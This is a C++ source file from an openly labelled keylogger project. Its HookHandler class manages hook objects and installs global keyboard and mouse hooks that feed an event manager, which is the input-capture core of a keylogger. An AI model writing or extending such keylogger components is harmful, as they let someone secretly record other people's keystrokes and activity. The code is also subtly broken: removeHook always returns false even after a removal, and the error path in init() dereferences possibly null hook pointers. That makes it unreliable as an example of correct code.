/**
 *						Project Keylogger
 */

#include				"keylogger_dll/HookHandler.h"

/**
 * HookHandler implementation
 */


/**
 * @param EventManager&
 */
HookHandler::HookHandler(const EventManager& eventManager) : _eventManager(eventManager){
}

/**
 * Add the AHook parameter to the list of hooks the handler contains.
 * 
 * @param AHook
 * @return bool
 */
const bool HookHandler::addHook(AHook* hook) {
   _hooks.push_back(hook);
   return true;
}

/**
 * Remove the AHook& paramater from the hook list contained by the HookHandler
 * 
 * @param const AHook&
 * @return bool
 */
const bool HookHandler::removeHook(AHook* hook) {

	for (std::vector<AHook*>::iterator it = _hooks.begin(); it != _hooks.end(); it++)
	{
		if (*it == hook)
		{
			_hooks.erase(it);
			break;
		}
	}
    return false;
}

const bool HookHandler::init()
{
	//Set the keyboard hook
	AHook* keyboardHook = new KeyboardHook(*(new HookObserver(this->_eventManager)));
	AHook* mouseHook = new MouseHook(*(new HookObserver(this->_eventManager)));

	if (keyboardHook == NULL || !keyboardHook->setHook() || mouseHook == NULL || !mouseHook->setHook())
	{
		std::cout << "HookHandler::init() : Fatal error on hook set !" << keyboardHook->getHook() << "||" << mouseHook->getHook() << std::endl;
		return false;
	}
	std::cout << "HookHandler::init ok." << std::endl;
	return true;
}